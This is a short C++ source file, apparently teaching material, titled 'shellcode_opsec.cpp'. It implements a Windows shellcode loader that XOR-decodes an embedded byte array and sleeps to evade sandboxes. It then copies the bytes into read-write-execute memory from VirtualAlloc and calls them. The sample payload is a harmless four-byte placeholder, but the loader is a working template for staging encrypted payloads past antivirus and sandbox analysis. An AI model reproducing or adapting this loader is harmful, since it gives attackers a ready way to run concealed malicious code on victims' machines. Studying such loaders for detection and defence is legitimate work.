// Filename: shellcode_opsec.cpp
// Purpose: Use delayed execution and encrypted shellcode to improve OPSEC.
// Instructor: Joas A Santos - https://www.linkedin.com/in/joas-antonio-dos-santos - https://github.com/CyberSecurityUP

#include <windows.h>
#include <iostream>
#include <vector>

void xorDecrypt(std::vector<BYTE>& data, BYTE key) {
    for (auto& b : data)
        b ^= key;
}

int main() {
    BYTE encryptedShellcode[] = { 0x31 ^ 0xAA, 0xC0 ^ 0xAA, 0x50 ^ 0xAA, 0xC3 ^ 0xAA }; // xor encoded
    std::vector<BYTE> shellcode(encryptedShellcode, encryptedShellcode + sizeof(encryptedShellcode));

    xorDecrypt(shellcode, 0xAA);
    Sleep(2000);  // delay for sandbox evasion

    void* mem = VirtualAlloc(0, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(mem, shellcode.data(), shellcode.size());
    ((void(*)())mem)();

    return 0;
}
